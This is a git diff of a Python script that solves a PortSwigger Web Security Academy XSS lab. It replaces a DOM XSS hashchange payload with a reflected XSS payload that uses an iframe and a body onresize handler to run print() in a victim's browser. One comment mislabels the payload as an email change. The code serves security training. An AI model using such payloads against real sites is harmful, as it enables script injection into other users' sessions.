@@ -2,12 +2,12 @@
 #
 # Author: Ahmed Elqalaawy (@elqal3awii)
 #
-# Date: 15/11/2023
+# Date: 21/11/2023
 #
-# Lab: DOM XSS in jQuery selector sink using a hashchange event
+# Lab: Reflected XSS into HTML context with most tags and attributes blocked
 #
-# Steps: 1. Craft an iframe that, when loaded, will append an img element to the hash part
-#           of the URL
+# Steps: 1. Craft an iframe that, when loaded, will change the body width, causing the 
+#           onresize event handler to be invoked
 #        2. Deliver the exploit to the victim
 #        3. The print() function will be called after they trigger the exploit
 #
@@ -26,16 +26,16 @@ from colorama import Fore
 #########
 
 # change this to your lab URL
-lab_url = "https://0ab900a5034d97b984d805e7005900b0.web-security-academy.net"
+lab_url = "https://0aa1006b04c591e78075306b00370046.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0aef0040033b970f84f4041c01b0006c.exploit-server.net"
+exploit_server_url = "https://exploit-0afd00c8043e910b805b2f0e0128001d.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
 
 # payload to change the victim's email
-payload = f"""<iframe src="{lab_url}/#" onload="this.src+='<img src=1 onerror=print()>'">"""
+payload = f"""<iframe src="{lab_url}/?search=<body onresize=print()>" onload=this.style.width='100px'>"""
 
 # data to send via POST
 data = {
